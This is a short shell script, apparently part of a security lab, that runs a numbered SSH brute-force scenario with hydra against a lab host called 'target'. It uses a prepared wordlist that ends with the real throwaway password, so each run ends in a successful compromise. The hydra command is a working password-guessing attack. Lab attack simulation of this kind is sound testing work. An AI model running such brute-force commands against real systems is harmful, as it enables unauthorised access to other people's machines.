#!/bin/sh
# Scenario 2: SSH brute-force attempt against the target.
# Uses the lab's own fake wordlist (ends with the real throwaway password,
# so the run also demonstrates a successful compromise).
# Usage: scenario2_sshbruteforce.sh <run_number>
RUN="${1:-1}"
echo "=== Scenario 2 (SSH brute force) run $RUN: $(date -u +%FT%TZ) ==="
hydra -l labuser -P /wordlist.txt -t 4 -f ssh://target
echo "=== end run $RUN ==="
